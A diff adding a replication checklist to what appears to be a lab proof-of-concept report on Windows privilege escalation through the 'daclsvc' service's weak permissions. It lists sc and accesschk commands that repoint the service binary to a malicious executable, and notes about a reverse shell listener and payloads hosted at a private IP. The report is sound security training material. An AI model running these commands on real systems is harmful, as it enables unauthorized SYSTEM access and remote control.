@@ -75,6 +75,54 @@ This PoC demonstrates how a low-privileged user can exploit the "Insecure Servic
 
 ---
 
+
+
+
+
+
+
+
+
+
+Below is a concise summary of the steps taken across all Proof of Concept (PoC) reports for the vulnerabilities ("Insecure Service Executables," "Insecure Autoruns," and "Insecure Service Permissions"). The steps are presented as a checklist that can be used to replicate the privilege escalation attacks on a Windows machine. The checklist is streamlined for clarity and focuses on the key actions required for each method.
+
+---
+
+## Checklist: Replicating this Attack on a Windows Machine
+**Target**: Exploit weak service permissions (`daclsvc`) to modify its binary path and execute a malicious binary.
+
+- [ ] Establish a reverse shell to the attacker machine (listener already set up).
+- [ ] Query the service to confirm it runs with SYSTEM privileges:  
+  `sc qc daclsvc`
+- [ ] Check the user’s permissions on the service using `accesschk`:  
+  `C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc`
+- [ ] Modify the service’s binary path to point to the malicious file `esc.exe`:  
+  `sc config daclsvc binpath= "\"C:\users\user\esc.exe\""`
+- [ ] Start the service to execute the malicious binary and gain a reverse shell:  
+  `net start daclsvc`
+- [ ] (Alternative) Modify the binary path to point to `malicious.exe` (e.g., to add the user to the admin group):  
+  `sc config daclsvc binpath= "C:\Users\user\malicious.exe"`  
+  Then start the service: `net start daclsvc`
+
+---
+
+### Notes
+- Ensure the malicious files (`esc.exe`, `x.exe`, `malicious.exe`) are hosted on an accessible server (e.g., `http://10.4.106.235/`).
+- Verify the listener port (e.g., `2294`) matches the configuration of the malicious binary.
+- The `accesschk.exe` tool must be available on the target system (e.g., at `C:\PrivEsc\accesschk.exe`).
+- Admin login (for Method 2) or service restart (for Methods 1 and 3) is required to trigger the exploit.
+
+
+
+
+
+
+
+
+
+
+
+
 ### Conclusion
 
 This PoC confirms that the "Insecure Service Permissions" vulnerability in the `daclsvc` service allows a low-privileged user to escalate privileges to `SYSTEM` level. By exploiting the `SERVICE_CHANGE_CONFIG` permission, an attacker can modify the service's binary path to execute arbitrary code with elevated privileges, posing a significant risk to system security. Immediate remediation is recommended, such as restricting service permissions to prevent unauthorized configuration changes and ensuring services run with the least privilege necessary.
